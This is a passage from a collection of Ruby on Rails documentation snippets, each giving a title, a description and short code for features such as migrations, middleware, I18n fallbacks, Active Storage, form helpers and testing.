DESCRIPTION: Migration that creates a join table with customized column options, allowing NULL values in the foreign key columns.

LANGUAGE: ruby
CODE:
create_join_table :products, :categories, column_options: { null: true }

----------------------------------------

TITLE: Manual Emulation of autoload_lib in Rails <7.1
DESCRIPTION: Shows how to manually add lib to autoload paths and ignore specific subdirectories in versions of Rails prior to 7.1 that don't have the config.autoload_lib method.

LANGUAGE: ruby
CODE:
# config/application.rb
module MyApp
  class Application < Rails::Application
    lib = root.join("lib")

    config.autoload_paths << lib
    config.eager_load_paths << lib

    Rails.autoloaders.main.ignore(
      lib.join("assets"),
      lib.join("tasks"),
      lib.join("generators")
    )

    # ...
  end
end

----------------------------------------

TITLE: Defining a Job Class for Use with Custom Queue Delimiter in Rails
DESCRIPTION: Shows an ActiveJob class that will use the configured prefix and delimiter. With the previous configuration, this job would be queued on "video_server.low_priority".

LANGUAGE: ruby
CODE:
class EncoderJob < ActiveJob::Base
  queue_as :low_priority
  #....
end

----------------------------------------

TITLE: Precompiling Assets for Production
DESCRIPTION: Command to precompile assets for production deployment. This processes all assets in the load path, generating digested versions for proper caching and versioning.

LANGUAGE: bash
CODE:
$ RAILS_ENV=production rails assets:precompile

----------------------------------------

TITLE: Generating Specific Rails Guides with the ONLY Variable
DESCRIPTION: Shows how to generate only a specific guide by using the ONLY environment variable with the rake task, which is useful for testing changes to a single guide.

LANGUAGE: bash
CODE:
$ touch my_guide.md
$ bundle exec rake guides:generate ONLY=my_guide

----------------------------------------

TITLE: Command Line Example Format in Documentation
DESCRIPTION: Demonstrates how to document command-line examples using the $ prefix for commands.

LANGUAGE: ruby
CODE:
# Run the following command:
#   $ bin/rails new zomg
#   ...

----------------------------------------

TITLE: Configuring Rails for Subdirectory Deployment
DESCRIPTION: This snippet shows how to configure a Rails application to run in a subdirectory instead of at the root path. It sets the relative URL root to prepend to all generated links.

LANGUAGE: ruby
CODE:
config.relative_url_root = "/app1"

----------------------------------------

TITLE: Setting Up Serialization with ActiveModel in Ruby
DESCRIPTION: Demonstrates how to include ActiveModel::Serialization in a class and define attributes for serialization. Includes a custom method that can be included in serialization.

LANGUAGE: ruby
CODE:
class Person
  include ActiveModel::Serialization

  attr_accessor :name, :age

  def attributes
    # Declaration of attributes that will be serialized
    { "name" => nil, "age" => nil }
  end

  def capitalized_name
    # Declared methods can be later included in the serialized hash
    name&.capitalize
  end
end

----------------------------------------

TITLE: Unescaped Return Values from to_param
DESCRIPTION: Shows that the to_param method should not escape special characters in its return value, as demonstrated with a string containing ampersand.

LANGUAGE: ruby
CODE:
"Tom & Jerry".to_param # => "Tom & Jerry"

----------------------------------------

TITLE: Inserting Middleware Before Another in Rails
DESCRIPTION: Demonstrates how to insert custom middleware before a specific middleware in the Rails stack. This allows for precise positioning of middleware in the request processing chain.

LANGUAGE: ruby
CODE:
config.middleware.insert_before Rack::Head, Magical::Unicorns

----------------------------------------

TITLE: Initializing a Person Model with Birth Date in Ruby
DESCRIPTION: This snippet shows how to initialize a Person model object with a birth_date attribute set to a specific Date. This will be used to demonstrate the date_select helper.

LANGUAGE: ruby
CODE:
@person = Person.new(birth_date: Date.new(1995, 12, 21))

----------------------------------------

TITLE: Creating Exclusion Constraints in PostgreSQL with Rails
DESCRIPTION: Demonstrates how to create exclusion constraints in PostgreSQL, which ensure that specified operations on values in specified columns across any two rows would not return true.

LANGUAGE: ruby
CODE:
# db/migrate/20131220144913_create_products.rb
create_table :products do |t|
  t.integer :price, null: false
  t.daterange :availability_range, null: false

  t.exclusion_constraint "price WITH =, availability_range WITH &&", using: :gist, name: "price_check"
end

----------------------------------------

TITLE: Using Module#prepend instead of alias_method_chain
DESCRIPTION: Rails 5.0 prefers using Ruby 2.0's Module#prepend feature instead of the deprecated alias_method_chain pattern for method overriding and extension.

LANGUAGE: ruby
CODE:
Module#prepend

----------------------------------------

TITLE: Updating Engine Script for Rails 3.2
DESCRIPTION: Code to update the script/rails file in Rails 3.2 engines, configuring the engine root and path for proper initialization.

LANGUAGE: ruby
CODE:
ENGINE_ROOT = File.expand_path('../..', __FILE__)
ENGINE_PATH = File.expand_path('../../lib/your_engine_name/engine', __FILE__)

require "rails/all"
require "rails/engine/commands"

----------------------------------------

TITLE: Generating Migration for Author Association
DESCRIPTION: Creates a migration to add the author_id column to the blorgh_articles table, establishing the relationship between articles and users.

LANGUAGE: bash
CODE:
$ bin/rails generate migration add_author_id_to_blorgh_articles author_id:integer

----------------------------------------

TITLE: Generating a New Rails 7.2 App with DevContainer Support
DESCRIPTION: Command to create a new Rails application with DevContainer support for Visual Studio Code. This allows for containerized development environments.

LANGUAGE: bash
CODE:
$ rails new myapp --devcontainer

----------------------------------------

TITLE: Using attr_internal for Library Attributes
DESCRIPTION: Demonstrates using attr_internal to define attributes in library classes that avoid name collisions with attributes in subclasses by using a naming convention.

LANGUAGE: ruby
CODE:
# library
class ThirdPartyLibrary::Crawler
  attr_internal :log_level
end

# client code
class MyCrawler < ThirdPartyLibrary::Crawler
  attr_accessor :log_level
end

----------------------------------------

TITLE: Creating Form Fields for Confirmation Validation
DESCRIPTION: ERB template example showing how to create the two text fields needed for confirmation validation in a Rails view.

LANGUAGE: ruby
CODE:
<%= text_field :person, :email %>
<%= text_field :person, :email_confirmation %>

----------------------------------------

TITLE: Rails Controller Fragment Cache Logging Standard Output
DESCRIPTION: Default logging output for fragment caching when verbose fragment cache logging is disabled. Shows simplified output without detailed read/write information.

LANGUAGE: ruby
CODE:
Rendered messages/_message.html.erb in 1.2 ms [cache hit]
Rendered recordings/threads/_thread.html.erb in 1.5 ms [cache miss]

----------------------------------------

TITLE: Implementing Conditional GET Support with stale? in Rails Controller
DESCRIPTION: Implements HTTP conditional GET support using the stale? method with explicit timestamp and etag parameters. This reduces bandwidth usage by serving 304 Not Modified responses when content hasn't changed.

LANGUAGE: ruby
CODE:
class ProductsController < ApplicationController
  def show
    @product = Product.find(params[:id])

    # If the request is stale according to the given timestamp and etag value
    # (i.e. it needs to be processed again) then execute this block
    if stale?(last_modified: @product.updated_at.utc, etag: @product.cache_key_with_version)
      respond_to do |wants|
        # ... normal response processing
      end
    end

    # If the request is fresh (i.e. it's not modified) then you don't need to do
    # anything. The default render checks for this using the parameters
    # used in the previous call to stale? and will automatically send a
    # :not_modified. So that's it, you're done.
  end
end

----------------------------------------

TITLE: Default Field Error HTML Markup in Rails Views
DESCRIPTION: This HTML snippet shows the default markup that Rails generates for form fields with validation errors. It wraps the input field in a div with the class 'field_with_errors'.

LANGUAGE: html
CODE:
<div class="field_with_errors">
  <input id="article_title" name="article[title]" size="30" type="text" value="">
</div>

----------------------------------------

TITLE: Configuring I18n Fallbacks with Locale Array in Ruby
DESCRIPTION: Sets up internationalization fallbacks using an array of locales. This approach defines a specific order of fallback locales (Turkish then English) when translations are missing.

LANGUAGE: ruby
CODE:
config.i18n.fallbacks = [:tr, :en]

----------------------------------------

TITLE: Finding a customer with composite primary key in Ruby using Active Record
DESCRIPTION: Example of finding a record using a composite primary key (store_id and id), demonstrating how to handle multi-column primary keys in Active Record.

LANGUAGE: ruby
CODE:
# Find the customer with store_id 3 and id 17
irb> customers = Customer.find([3, 17])
=> #<Customer store_id: 3, id: 17, first_name: "Magda">

----------------------------------------

TITLE: Removing Session-Related Middlewares from Rails Configuration
DESCRIPTION: Shows how to remove all session-related middlewares from a Rails application, which is useful for API-only applications or when implementing custom session handling.

LANGUAGE: ruby
CODE:
# config/application.rb
config.middleware.delete ActionDispatch::Cookies
config.middleware.delete ActionDispatch::Session::CookieStore
config.middleware.delete ActionDispatch::Flash

----------------------------------------

TITLE: Configuring Postmark Ingress in Rails
DESCRIPTION: Rails configuration to accept emails from Postmark. This enables the Postmark ingress in the application's production environment.

LANGUAGE: ruby
CODE:
# config/environments/production.rb
config.action_mailbox.ingress = :postmark

----------------------------------------

TITLE: Updating Gemfile for Rails 3.1.12
DESCRIPTION: Configures the Gemfile with Rails 3.1.12 dependencies, including asset pipeline gems (sass-rails, coffee-rails, uglifier) and jQuery as the default JavaScript library.

LANGUAGE: ruby
CODE:
gem "rails", "3.1.12"
gem "mysql2"

# Needed for the new asset pipeline
group :assets do
  gem "sass-rails",   "~> 3.1.7"
  gem "coffee-rails", "~> 3.1.1"
  gem "uglifier",     ">= 1.0.3"
end

# jQuery is the default JavaScript library in Rails 3.1
gem "jquery-rails"

----------------------------------------

TITLE: Configuring Models to Allow Destroying Associated Objects
DESCRIPTION: Shows how to configure a model to allow deletion of associated records through nested forms by using the allow_destroy option with accepts_nested_attributes_for.

LANGUAGE: ruby
CODE:
class Person < ApplicationRecord
  has_many :addresses
  accepts_nested_attributes_for :addresses, allow_destroy: true
end

----------------------------------------

TITLE: Configuring Active Storage to Use Vips for Image Processing
DESCRIPTION: Sets the Active Storage variant processor to use libvips instead of ImageMagick for better performance and resource usage when generating image variants.

LANGUAGE: ruby
CODE:
Rails.application.config.active_storage.variant_processor = :vips

----------------------------------------

TITLE: Shorthand Syntax for link_to with Objects in Rails
DESCRIPTION: Shows the shorthand syntax for link_to that accepts an array of objects directly. This is the most concise way to generate links to nested resources using model instances.

LANGUAGE: erb
CODE:
<%= link_to 'Ad details', [@magazine, @ad] %>

----------------------------------------

TITLE: Transactional Callback Ordering Example
DESCRIPTION: Example showing how from Rails 7.1, transaction callbacks run in the order they are defined. The first callback is executed first, followed by the second.

LANGUAGE: ruby
CODE:
class User < ActiveRecord::Base
  after_commit { Rails.logger.info("this gets called first") }
  after_commit { Rails.logger.info("this gets called second") }
end

----------------------------------------

TITLE: URL Escaping with to_query
DESCRIPTION: Shows how to_query properly escapes both keys and values for use in query strings, including special characters and brackets.

LANGUAGE: ruby
CODE:
account.to_query("company[name]")
# => "company%5Bname%5D=Johnson+%26+Johnson"

----------------------------------------

TITLE: Original Default Headers Configuration in Rails
DESCRIPTION: The default HTTP headers configuration for Action Dispatch in earlier versions of Rails. Includes security headers like X-Frame-Options, X-XSS-Protection, and other cross-origin related policies.

LANGUAGE: ruby
CODE:
{
  "X-Frame-Options" => "SAMEORIGIN",
  "X-XSS-Protection" => "1; mode=block",
  "X-Content-Type-Options" => "nosniff",
  "X-Download-Options" => "noopen",
  "X-Permitted-Cross-Domain-Policies" => "none",
  "Referrer-Policy" => "strict-origin-when-cross-origin"
}

----------------------------------------

TITLE: Running Rails Generators with generate Method
DESCRIPTION: Example of running a Rails generator with arguments using the generate method to create a scaffold with specified attributes.

LANGUAGE: ruby
CODE:
generate(:scaffold, "person", "name:string", "address:text", "age:number")

----------------------------------------

TITLE: Running Rails Console in Docker Container
DESCRIPTION: Command to start a Rails console within a Docker container, accessing the application with persistent storage.

LANGUAGE: bash
CODE:
$ docker run --rm -it -v app-storage:/rails/storage --env RAILS_MASTER_KEY=<your-config-master-key> app console

----------------------------------------

TITLE: Creating a Rails 3.0 Application with Edge Version
DESCRIPTION: Demonstrates how to create a new Rails application using the cutting-edge version directly from the Git repository by passing the --edge flag to the rails new command.

LANGUAGE: bash
CODE:
$ rails new myapp --edge

----------------------------------------

TITLE: Permitting Hash Parameters in Rails
DESCRIPTION: This example demonstrates how to permit hash values in parameters. By mapping to an empty hash, all scalar values within the hash are permitted.

LANGUAGE: ruby
CODE:
params = ActionController::Parameters.new(options: { darkmode: true })
=> #<ActionController::Parameters {"options"=>{"darkmode"=>true}} permitted: false>
params.permit(options: {})
=> #<ActionController::Parameters {"options"=>#<ActionController::Parameters {"darkmode"=>true} permitted: true>} permitted: true>

----------------------------------------

TITLE: Using Optional Keyword Arguments in ERB Templates
DESCRIPTION: Example demonstrating how to use optional keyword arguments with splat operators in ERB templates. This allows passing additional attributes to HTML elements in a flexible way.

LANGUAGE: erb
CODE:
<%# locals: (message: "Hello, world!", **attributes) -%>
<%= tag.p(message, **attributes) %>

----------------------------------------

TITLE: Defining Active Record enums in Rails 4.1
DESCRIPTION: Example of using the new enum feature in Active Record to map string values to integers in the database. Enums provide helper methods for querying and updating the attribute.

LANGUAGE: ruby
CODE:
class Conversation < ActiveRecord::Base
  enum status: [ :active, :archived ]
end

conversation.archived!
conversation.active? # => false
conversation.status  # => "archived"

Conversation.archived # => Relation for all archived Conversations

Conversation.statuses # => { "active" => 0, "archived" => 1 }

----------------------------------------

TITLE: Testing HTML and JSON Responses with Built-in Parsers in Rails
DESCRIPTION: Shows how to use the default HTML and JSON parsers in ActionView::TestCase to test rendered content. The HTML parser uses Nokogiri, while the JSON parser returns a HashWithIndifferentAccess.

LANGUAGE: ruby
CODE:
test "renders HTML" do
  article = Article.create!(title: "Hello, world")

  render partial: "articles/article", locals: { article: article }

  assert_pattern { rendered.html.at("main h1") => { content: "Hello, world" } }
end

test "renders JSON" do
  article = Article.create!(title: "Hello, world")

  render formats: :json, partial: "articles/article", locals: { article: article }

  assert_pattern { rendered.json => { title: "Hello, world" } }
end

----------------------------------------

TITLE: Configuring Custom Railties Load Order in Rails
DESCRIPTION: Example of manually specifying the order in which Railties and Engines are loaded in a Rails application. This allows controlling the initialization sequence for engines and the main application.

LANGUAGE: ruby
CODE:
config.railties_order = [Blog::Engine, :main_app, :all]

----------------------------------------

TITLE: Using Legacy Rails Validation Helper Methods
DESCRIPTION: Example of the older validation helper method syntax used in older Rails versions. While still functional, this syntax is less preferred than the more concise modern syntax.

LANGUAGE: ruby
CODE:
validates_presence_of :name

----------------------------------------

TITLE: Creating an Entry with an Entryable Subclass
DESCRIPTION: Shows how to create a new Entry object while specifying its entryable subclass simultaneously.

LANGUAGE: ruby
CODE:
Entry.create! entryable: Message.new(subject: "hello!")

----------------------------------------

TITLE: Setting Time Zone in Rails Configuration
DESCRIPTION: Sets the application time zone to Central Time (US & Canada). This is a configuration setting for Rails itself, typically placed in config/application.rb file.

LANGUAGE: ruby
CODE:
config.time_zone = "Central Time (US & Canada)"

----------------------------------------

TITLE: Generating Scaffold Controller with Tests
DESCRIPTION: Shows the command to generate a controller with corresponding test files using Rails scaffold generator.

LANGUAGE: bash
CODE:
$ bin/rails generate scaffold_controller article
...
create  app/controllers/articles_controller.rb
...
invoke  test_unit
create    test/controllers/articles_controller_test.rb
...

----------------------------------------

TITLE: Changing Column Default Value
DESCRIPTION: Migration that changes the default value of a column using change_column_default with explicit from and to values to ensure reversibility.

LANGUAGE: ruby
CODE:
change_column_default :products, :approved, from: true, to: false

----------------------------------------

TITLE: Using Array of Validation Contexts in Rails
DESCRIPTION: Shows how to use an array of symbols for the :on option to apply validations to multiple contexts. This allows a validation to be active in multiple specific scenarios without being active by default.

LANGUAGE: ruby
CODE:
class Book
  include ActiveModel::Validations

  validates :title, presence: true, on: [:update, :ensure_title]
end

----------------------------------------

TITLE: Installing Dependencies on Arch Linux
DESCRIPTION: Commands to install all required dependencies for Rails development on Arch Linux, including database systems (MariaDB instead of MySQL), Redis, memcached, and tools for image/video processing. Also includes steps to initialize and start services.

LANGUAGE: bash
CODE:
$ sudo pacman -S sqlite mariadb libmariadbclient mariadb-clients postgresql postgresql-libs redis memcached imagemagick ffmpeg mupdf mupdf-tools poppler yarn libxml2 libvips poppler
$ sudo mariadb-install-db --user=mysql --basedir=/usr --datadir=/var/lib/mysql
$ sudo systemctl start redis mariadb memcached

----------------------------------------

TITLE: Specifying Response Format in Rails Render
DESCRIPTION: Examples of using the :formats option to specify the format of the response. This can be a single format or multiple formats in an array.

LANGUAGE: ruby
CODE:
render formats: :xml
render formats: [:json, :xml]

----------------------------------------

TITLE: Using Attach Method to Add Attachments Without Replacing
DESCRIPTION: Demonstrates how to add new attachments without removing existing ones in Rails 6.0 by using the #attach method rather than assignment. This preserves the previous files while adding new ones.

LANGUAGE: ruby
CODE:
blob = ActiveStorage::Blob.create_after_upload!(filename: "town.jpg")
user.highlights.attach(blob)

user.highlights.count # => 2
user.highlights.first.filename # => "funky.jpg"
user.highlights.second.filename # => "town.jpg"

----------------------------------------

TITLE: Converting Invalid Strings to Dates in Rails 4.0
DESCRIPTION: Shows how string-to-date conversion behavior has changed in Rails 4.0. In ActiveSupport 4.0, invalid date strings now raise ArgumentError instead of NoMethodError, and some previously invalid numeric strings are now converted to dates.

LANGUAGE: ruby
CODE:
# ActiveSupport 3.x
"asdf".to_date # => NoMethodError: undefined method `div' for nil:NilClass
"333".to_date # => NoMethodError: undefined method `div' for nil:NilClass

# ActiveSupport 4
"asdf".to_date # => ArgumentError: invalid date
"333".to_date # => Fri, 29 Nov 2013

----------------------------------------

TITLE: Implementing Checkboxes in Rails Forms
DESCRIPTION: Demonstrates how to create multiple checkboxes in a form. Each checkbox includes a hidden field with value 0 to ensure a value is submitted even when unchecked. Labels are provided for accessibility.

LANGUAGE: erb
CODE:
<%= form.checkbox :biography %>
<%= form.label :biography, "Biography" %>
<%= form.checkbox :romance %>
<%= form.label :romance, "Romance" %>
<%= form.checkbox :mystery %>
<%= form.label :mystery, "Mystery" %>

LANGUAGE: html
CODE:
<input name="biography" type="hidden" value="0" autocomplete="off"><input type="checkbox" value="1" name="biography" id="biography">
<label for="biography">Biography</label>
<input name="romance" type="hidden" value="0" autocomplete="off"><input type="checkbox" value="1" name="romance" id="romance">
<label for="romance">Romance</label>
<input name="mystery" type="hidden" value="0" autocomplete="off"><input type="checkbox" value="1" name="mystery" id="mystery">
<label for="mystery">Mystery</label>

LANGUAGE: ruby
CODE:
{
  "biography" => "1",
  "romance" => "0",
  "mystery" => "0"
}

----------------------------------------

TITLE: Subscribing to Events Using a Block with Multiple Arguments in Ruby
DESCRIPTION: This snippet shows how to subscribe to the 'process_action.action_controller' event using a block that takes five arguments: name, start time, finish time, unique ID, and payload. This approach is useful when you don't need all the data recorded by an Event object.

LANGUAGE: ruby
CODE:
ActiveSupport::Notifications.subscribe "process_action.action_controller" do |name, started, finished, unique_id, payload|
  # your own custom stuff
  Rails.logger.info "#{name} Received! (started: #{started}, finished: #{finished})" # process_action.action_controller Received! (started: 2019-05-05 13:43:57 -0800, finished: 2019-05-05 13:43:58 -0800)
end

----------------------------------------

TITLE: Swapping Rails Middleware with Custom Implementation
DESCRIPTION: Shows how to completely replace a middleware with another implementation. This is useful when you want to maintain the same position in the stack but change the behavior.

LANGUAGE: ruby
CODE:
config.middleware.swap ActionController::Failsafe, Lifo::Failsafe

----------------------------------------

TITLE: Updating belongs_to with Class to String Conversion
DESCRIPTION: Modifies the belongs_to association to convert the Class returned by author_class back to a string for proper ActiveRecord configuration.

LANGUAGE: ruby
CODE:
belongs_to :author, class_name: Blorgh.author_class.to_s

----------------------------------------

TITLE: Creating Locale-Specific Links in Rails
DESCRIPTION: Code snippet for creating links to different locale versions of a website, using application configuration settings to maintain different URLs for different languages.

LANGUAGE: ruby
CODE:
link_to("Deutsch", "#{APP_CONFIG[:deutsch_website_url]}#{request.env['PATH_INFO']}")

----------------------------------------

TITLE: Marking Helper Method Dependencies in ERB
DESCRIPTION: Adding a comment to explicitly indicate when a helper method has been updated, ensuring the cache will be invalidated when the helper changes. This technique addresses external dependencies that affect template rendering.

LANGUAGE: html+erb
CODE:
<%# Helper Dependency Updated: Jul 28, 2015 at 7pm %>
<%= some_helper_method(person) %>

----------------------------------------

TITLE: Filtering Records with Having Clause in Active Record
DESCRIPTION: Demonstrates how to use the :having option on find method for filtering records in grouped queries, which allows filtering based on aggregated results.

LANGUAGE: ruby
CODE:
developers = Developer.find(:all, :group => "salary",
  :having => "sum(salary) > 10000", :select => "salary")

----------------------------------------

TITLE: Setting Up PostgreSQL Database for Active Record Tests
DESCRIPTION: Shows how to set up the PostgreSQL database required for running Active Record tests. This creates necessary tables with appropriate users and permissions.

LANGUAGE: bash
CODE:
$ cd activerecord
$ bundle exec rake db:postgresql:build

----------------------------------------

TITLE: Using bang version of OrderedOptions methods
DESCRIPTION: Enhanced version of get methods for OrderedOptions that raises a KeyError if the value is blank, providing stricter option access.

LANGUAGE: ruby
CODE:
# Example usage
options = ActiveSupport::OrderedOptions.new
options.name = ""
options.name! # Raises KeyError

----------------------------------------

TITLE: Using Action Mailer with Deferred Execution in Rails 4.2
DESCRIPTION: Code example demonstrating how to use the new Action Mailer API with deferred execution, showing that the mailer method is not called until deliver_now is explicitly invoked.

LANGUAGE: ruby
CODE:
mail = Notifier.notify(user) # Notifier#notify is not yet called at this point
mail = mail.deliver_now           # Prints "Called"

----------------------------------------

TITLE: Controlling Association Caching in Rails
DESCRIPTION: Demonstrates how to control caching of associations, including loading data, using cached data, and reloading when necessary to ensure fresh data.

LANGUAGE: ruby
CODE:
# retrieves books from the database
author.books.load

# uses the cached copy of books
author.books.size

# uses the cached copy of books
author.books.empty?

----------------------------------------

TITLE: Fetching Headers with cURL from Origin Server
DESCRIPTION: Demonstrates using cURL to request headers from your origin server to check caching configurations, showing HTTP response headers including Cache-Control settings.

LANGUAGE: bash
CODE:
$ curl -I http://www.example/assets/application-d0e099e021c95eb0de3615fd1d8c4d83.css
HTTP/1.1 200 OK
Server: Cowboy
Date: Sun, 24 Aug 2014 20:27:50 GMT
Connection: keep-alive
Last-Modified: Thu, 08 May 2014 01:24:14 GMT
Content-Type: text/css
Cache-Control: public, max-age=2592000
Content-Length: 126560
Via: 1.1 vegur

----------------------------------------

TITLE: Configuring Test Environment for Static Assets
DESCRIPTION: Adds configuration for the test environment to enable static asset server with cache control headers for improved performance during testing.

LANGUAGE: ruby
CODE:
# Configure static asset server for tests with Cache-Control for performance
config.public_file_server.enabled = true
config.public_file_server.headers = {
  "Cache-Control" => "public, max-age=3600"
}

----------------------------------------

TITLE: Configuring I18n with an Initializer in Rails
DESCRIPTION: Demonstrates how to configure I18n settings using a dedicated initializer file, including setting custom load paths, available locales, and the default locale.

LANGUAGE: ruby
CODE:
# config/initializers/locale.rb

# Where the I18n library should search for translation files
I18n.load_path += Dir[Rails.root.join("lib", "locale", "*.{rb,yml}")]

# Permitted locales available for the application
I18n.available_locales = [:en, :pt]

# Set default locale to something other than :en
I18n.default_locale = :pt

----------------------------------------

TITLE: Setting request variants in Rails controllers
DESCRIPTION: Example of setting request variants for different devices (tablet, phone, desktop) in a controller action. Variants allow rendering different templates based on the client device.

LANGUAGE: ruby
CODE:
request.variant = :tablet if request.user_agent =~ /iPad/

----------------------------------------

TITLE: SQL Equivalent for Finding a Record with Composite Primary Key
DESCRIPTION: Shows the SQL query that corresponds to the Ruby code for finding a product with a composite primary key.

LANGUAGE: sql
CODE:
SELECT * FROM products WHERE store_id = 3 AND sku = "XYZ12345"

----------------------------------------

TITLE: Loading Rails 7.0 Defaults in Application Configuration
DESCRIPTION: Demonstrates the simplified way to load Rails 7.0 defaults, which includes setting the new cache serialization format to 7.0 automatically.

LANGUAGE: ruby
CODE:
# config/application.rb

config.load_defaults 7.0

----------------------------------------

TITLE: Setting Active Storage Routes Prefix in Ruby
DESCRIPTION: Configures the route prefix for URLs served by Active Storage. This overrides the default prefix '/rails/active_storage' with a custom prefix '/files'.

LANGUAGE: ruby
CODE:
config.active_storage.routes_prefix = "/files"

----------------------------------------

TITLE: Internal Link Formatting in Rails Guides
DESCRIPTION: Shows the proper way to create internal links (anchors) within Rails Guides, emphasizing descriptive link text over generic terms like "below".

LANGUAGE: markdown
CODE:
# BAD
We will cover this [below](#multiple-callback-conditions).

# GOOD
We will cover this in the [multiple callback conditions
section](#multiple-callback-conditions) shown below.

----------------------------------------

TITLE: Using to_param in ActiveModel::Conversion in IRB
DESCRIPTION: This IRB session demonstrates the to_param method from ActiveModel::Conversion. It returns a string representation of the object's key suitable for use in URLs, or nil if the object is not persisted.

LANGUAGE: ruby
CODE:
irb> person.to_param
=> "1"

----------------------------------------

TITLE: Implementing Model Validation to Make Tests Pass
DESCRIPTION: Shows how to implement a model validation to make a previously failing test pass by enforcing the presence of a title attribute.

LANGUAGE: ruby
CODE:
class Article < ApplicationRecord
  validates :title, presence: true
end

----------------------------------------

TITLE: Customizing to_model in ActiveModel::Conversion
DESCRIPTION: This code shows how to customize the to_model method to return a proxy object that wraps the original object with Active Model compliant methods. This is useful when your model doesn't fully comply with the Active Model interface.

LANGUAGE: ruby
CODE:
class Person
  def to_model
    # A proxy object that wraps your object with Active Model compliant methods.
    PersonModel.new(self)
  end
end

----------------------------------------

TITLE: Using Regular and Fixed-width Fonts in Ruby Documentation
DESCRIPTION: Demonstrates when to use regular font versus fixed-width font for boolean values and code elements in method documentation.

LANGUAGE: ruby
CODE:
# Runs all the validations within the specified context.
# Returns true if no errors are found, false otherwise.
#
# If the argument is false (default is +nil+), the context is
# set to <tt>:create</tt> if <tt>new_record?</tt> is true,
# and to <tt>:update</tt> if it is not.
#
# Validations with no <tt>:on</tt> option will run no
# matter the context. Validations with # some <tt>:on</tt>
# option will only run in the specified context.
def valid?(context = nil)
  # ...
end

----------------------------------------

TITLE: Configuring I18n Fallbacks with Individual Locale Mappings in Ruby
DESCRIPTION: Sets up internationalization fallbacks using a hash to define individual fallback rules for specific locales. This allows for complex fallback strategies where different locales have different fallback paths.

LANGUAGE: ruby
CODE:
config.i18n.fallbacks = { az: :tr, da: [:de, :en] }
#or
config.i18n.fallbacks.map = { az: :tr, da: [:de, :en] }

----------------------------------------

TITLE: Generating URLs with url_for Helper in Action Mailer
DESCRIPTION: Example of using the url_for helper with manually specified host parameter to generate a full URL in a mailer template when the host isn't configured globally.

LANGUAGE: erb
CODE:
<%= url_for(host: 'example.com',
            controller: 'welcome',
            action: 'greeting') %>

----------------------------------------

TITLE: Running a Single Test File with a Specific Seed in Rails
DESCRIPTION: Demonstrates how to run a single test file with a specific randomization seed. This allows for more precise reproduction of test failures.

LANGUAGE: bash
CODE:
$ cd actionmailer
$ SEED=15002 bin/test test/mail_layout_test.rb

----------------------------------------

TITLE: Implementing Rackup::Server#start Method for Rack Server Initialization in Ruby
DESCRIPTION: The start method of Rackup::Server class that sets up the Rack environment, processes command-line options, handles daemonization, and runs the web server with the Rails application.

LANGUAGE: ruby
CODE:
module Rackup
  class Server
    def start(&block)
      if options[:warn]
        $-w = true
      end

      if includes = options[:include]
        $LOAD_PATH.unshift(*includes)
      end

      Array(options[:require]).each do |library|
        require library
      end

      if options[:debug]
        $DEBUG = true
        require "pp"
        p options[:server]
        pp wrapped_app
        pp app
      end

      check_pid! if options[:pid]

      # Touch the wrapped app, so that the config.ru is loaded before
      # daemonization (i.e. before chdir, etc).
      handle_profiling(options[:heapfile], options[:profile_mode], options[:profile_file]) do
        wrapped_app
      end

      daemonize_app if options[:daemonize]

      write_pid if options[:pid]

      trap(:INT) do
        if server.respond_to?(:shutdown)
          server.shutdown
        else
          exit
        end
      end

      server.run(wrapped_app, **options, &block)
    end
  end
end

----------------------------------------

TITLE: Enabling Automatic Nonce Application in Rails
DESCRIPTION: This configuration enables automatic application of nonces to JavaScript and stylesheet tags, eliminating the need to manually specify nonce: true for each tag when using a nonce-based Content Security Policy.

LANGUAGE: ruby
CODE:
Rails.application.config.content_security_policy_nonce_auto = true

----------------------------------------

TITLE: Implementing HTTP Digest Authentication in Rails Controllers
DESCRIPTION: Shows how to implement HTTP digest authentication in a Rails controller by using the authenticate_or_request_with_http_digest method with a password lookup block.

LANGUAGE: ruby
CODE:
class PostsController < ApplicationController
  Users = {"dhh" => "secret"}
  before_filter :authenticate

  def secret
    render :text => "Password Required!"
  end

  private
  def authenticate
    realm = "Application"
    authenticate_or_request_with_http_digest(realm) do |name|
      Users[name]
    end
  end
end

----------------------------------------

TITLE: Configuring Action Mailer Queue Name
DESCRIPTION: Rails 5 allows changing the default queue name for Action Mailer jobs from 'mailers' to a custom name through this configuration option.

LANGUAGE: ruby
CODE:
config.action_mailer.deliver_later_queue_name = :new_queue_name

----------------------------------------

TITLE: Using Array#without to exclude elements
DESCRIPTION: Returns a copy of an enumerable without the specified elements, providing a cleaner alternative to filtering with reject.

LANGUAGE: ruby
CODE:
#without

----------------------------------------

TITLE: Traditional Test Method Definition in Rails
DESCRIPTION: Shows the traditional way of defining test methods in Rails without using the test macro, where method names must start with 'test_'.

LANGUAGE: ruby
CODE:
def test_the_truth
  assert true
end

----------------------------------------

TITLE: Generating URLs with url_for Helper in Action Mailer
DESCRIPTION: Example of using the url_for helper with manually specified host parameter to generate a full URL in a mailer template when the host isn't configured globally.

LANGUAGE: erb
CODE:
<%= url_for(host: 'example.com',
            controller: 'welcome',
            action: 'greeting') %>

----------------------------------------

TITLE: Generating RDoc Documentation for Rails API
DESCRIPTION: Command for generating the Rails API documentation using RDoc. This should be run from the Rails root directory after installing dependencies with bundle install.

LANGUAGE: bash
CODE:
$ bundle exec rake rdoc

----------------------------------------

TITLE: Rails 3.2 Development Environment Configuration
DESCRIPTION: New configuration settings that should be added to the development environment when upgrading to Rails 3.2, including mass assignment protection and query plan logging.

LANGUAGE: ruby
CODE:
# Raise exception on mass assignment protection for Active Record models
config.active_record.mass_assignment_sanitizer = :strict

# Log the query plan for queries taking more than this (works
# with SQLite, MySQL, and PostgreSQL)
config.active_record.auto_explain_threshold_in_seconds = 0.5

----------------------------------------

TITLE: Creating a Comment Form Partial with Nested Resources
DESCRIPTION: Defines a form partial for creating new comments that uses the nested resource structure between articles and comments.

LANGUAGE: html
CODE:
<h3>New comment</h3>
<%= form_with model: [@article, @article.comments.build] do |form| %>
  <p>
    <%= form.label :text %><br>
    <%= form.textarea :text %>
  </p>
  <%= form.submit %>
<% end %>

----------------------------------------

TITLE: Complete Article Model with Comments Association in Rails Engine
DESCRIPTION: Shows the full Article model class with the has_many comments association defined within the Blorgh module namespace.

LANGUAGE: ruby
CODE:
module Blorgh
  class Article < ApplicationRecord
    has_many :comments
  end
end

----------------------------------------

TITLE: Requiring Both Original and Confirmation Fields
DESCRIPTION: Example showing how to validate both the presence of the confirmation field and the confirmation matching, ensuring both fields are filled out.

LANGUAGE: ruby
CODE:
class Person < ApplicationRecord
  validates :email, confirmation: true
  validates :email_confirmation, presence: true
end

